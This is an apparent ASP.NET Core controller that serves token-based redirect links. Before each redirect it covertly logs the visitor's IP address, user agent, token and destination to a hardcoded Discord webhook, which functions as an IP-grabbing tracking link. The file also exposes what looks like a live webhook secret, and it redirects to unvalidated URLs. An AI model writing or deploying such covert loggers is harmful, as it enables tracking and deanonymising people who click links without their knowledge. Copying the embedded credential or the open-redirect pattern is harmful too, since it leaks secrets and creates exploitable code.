using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using System.Text;
using System.Text.Json;

namespace BanHostAPI.Controllers
{
    [Route("")]
    [ApiController]
    public class UrlController : ControllerBase
    {
        public class DiscordWebhookClient
        {
            private readonly HttpClient _httpClient;

            public DiscordWebhookClient()
            {
                _httpClient = new HttpClient();
            }

            public async Task SendMessage(string webhookUrl, string message)
            {
                var payload = new
                {
                    content = message
                };

                var jsonPayload = JsonSerializer.Serialize(payload);
                var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

                await _httpClient.PostAsync(webhookUrl, content);
            }
        }

        [HttpGet]
        public IActionResult redirectUrl(string t)
        {
            var hook = "https://discord.com/api/webhooks/927184077897994251/cXXL6zel9DTyqsfLX_NDZWIbSE3OredSW4s8sQq4eW8t87f7--TTOSSkYskesH_Goyq4";
            var sender = new DiscordWebhookClient();
            var info = Request.Headers["User-Agent"];
            var red = Uri.UnescapeDataString(SqliteAccess.GetUrl(t));
            var ip = HttpContext.Connection.RemoteIpAddress?.ToString();
            string msg = @$"```
UserAgent: {info}
---------------------------
IP: {ip}
Token: {t}
Destination: {red}
TimeStamp: {DateTime.Now.AddHours(4)}
```";
            sender.SendMessage(hook, msg);
            return Redirect(red);
        }

    }
}
